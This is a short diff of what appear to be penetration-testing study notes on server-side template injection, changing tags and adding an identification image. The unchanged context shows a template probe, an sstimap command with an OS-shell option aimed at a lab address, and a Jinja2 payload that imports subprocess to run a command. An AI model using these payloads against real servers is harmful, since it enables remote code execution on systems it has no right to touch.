@@ -1,4 +1,4 @@
-[[php]] [[nodejs]] [[python]]
+#php #nodejs #python
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
 
 1. **Jinja2 (python)/Twig (PHP)** - `{{7*'7'}}`
@@ -53,3 +53,5 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 
 {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
 ```
+##### Identification guide
+![[identify SSTI.png]]
